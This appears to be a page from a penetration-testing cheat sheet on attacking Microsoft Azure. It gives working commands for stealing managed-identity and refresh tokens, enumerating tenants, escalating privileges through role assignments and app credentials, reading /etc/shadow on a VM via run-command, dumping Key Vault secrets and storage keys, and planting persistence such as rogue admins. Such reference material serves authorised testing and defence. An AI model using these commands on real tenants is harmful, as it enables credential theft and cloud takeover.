---
tags:
  - Cloud
---

# :material-microsoft-azure: Azure

<span class="pill pill-hard">cloud</span> <span class="pill pill-info">entra id</span>

Azure splits into two planes: **Entra ID** (formerly Azure AD — the identity layer for users, apps, and tenants) and **Azure Resource Manager** (ARM — the VMs, storage, and infrastructure). Attacks flow between them.

!!! abstract "TL;DR"
    Grab a token (managed identity via IMDS, a stolen refresh token, or a service principal secret), enumerate the tenant and your roles, then abuse role assignments / app permissions / Key Vault to escalate. Global Admin or Owner on the root management group is the crown.

## :material-key: Getting tokens

=== "Managed Identity (from an Azure VM)"

    ```bash
    curl -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    # Also request tokens for other audiences:
    #   https://graph.microsoft.com/   https://vault.azure.net/   https://storage.azure.com/
    ```

=== "az CLI / device code"

    ```bash
    az login                         # interactive
    az account get-access-token      # dump the current token
    # Device-code phishing (with consent):
    #   request a device code for a first-party client and relay to target
    ```

=== "Service principal"

    ```bash
    az login --service-principal -u <appId> -p <secret> --tenant <tenantId>
    ```

!!! loot "Refresh tokens are gold"
    A stolen **refresh token** (from `~/.azure`, browser storage, or a token cache) mints fresh access tokens for many resources and is long-lived. Tools like [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) pivot one token into others (Graph, ARM, Key Vault…).

## :material-format-list-bulleted: Enumeration

```bash
# Identity plane (Entra ID) — AzureAD / Microsoft Graph
az ad signed-in-user show
az ad user list      ;  az ad group list  ;  az role assignment list --all

# Resource plane (ARM)
az account show
az resource list
az vm list  ;  az storage account list  ;  az keyvault list

# Attacker tooling
roadrecon                  # dump the whole tenant to a DB
AzureHound                 # BloodHound collector for Azure
Get-AzureADRolePermissions # PowerZure / AzureHound analysis
```

!!! tip "BloodHound for Azure"
    Run **AzureHound** and load it into BloodHound. It maps Entra roles, subscription RBAC, and app ownership so "shortest path to Global Admin" becomes a query, exactly like on-prem AD.

## :material-arrow-up-bold-hexagon-outline: Privilege escalation

| Primitive | Escalation |
| --- | --- |
| Owner/`Microsoft.Authorization/*` on a scope | Assign yourself any role |
| `Microsoft.Compute/virtualMachines/runCommand` | Run SYSTEM commands on a VM |
| Ownership of an app / service principal | Add credentials, act as the SP |
| `Application.ReadWrite.All` (Graph) | Add secret to any app → escalate |
| Privileged Auth Admin | Reset a Global Admin's password |
| Dynamic group membership rule abuse | Meet the rule → auto-join privileged group |

Example — run commands on a VM you have rights over:

```bash
az vm run-command invoke -g RG -n VM \
  --command-id RunShellScript --scripts "id; cat /etc/shadow"
```

Example — add a secret to an app you own, then log in as it:

```bash
az ad app credential reset --id <appId> --append
az login --service-principal -u <appId> -p <newSecret> --tenant <tid>
```

## :material-safe-square: Key Vault & Storage

```bash
# Key Vault — secrets, keys, certs (needs a vault.azure.net token + access policy/RBAC)
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# Storage — blobs, often public or with leaked keys
az storage account keys list -n <acct> -g <rg>
az storage blob list --account-name <acct> -c <container> --auth-mode key
```

!!! loot "Key Vault is a credential piñata"
    Vaults routinely hold DB passwords, API keys, TLS private keys, and connection strings. One vault often unlocks half the environment.

## :material-anchor: Persistence

- Add credentials/certs to a service principal (survives password resets).
- Create a new app registration with broad Graph permissions.
- Add a rogue global admin or configure a backdoor federated domain.
- Register a persistent device / abuse Conditional Access exclusions.

!!! opsec "Azure logs to the Activity Log & Entra sign-in logs"
    Role assignments, app credential changes, and `runCommand` are all recorded and are exactly what defenders hunt for. Expect Microsoft Defender for Cloud to flag them.

## :material-link-variant: Related

- Reached via [SSRF](../web/ssrf.md) → managed identity token.
- Contrast IAM models with [AWS](aws.md) and [GCP](gcp.md).
- On-prem→cloud pivots connect to [Active Directory](../network/active-directory.md) (Entra Connect / hybrid).
- Reference: [HackTricks Cloud – Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html).
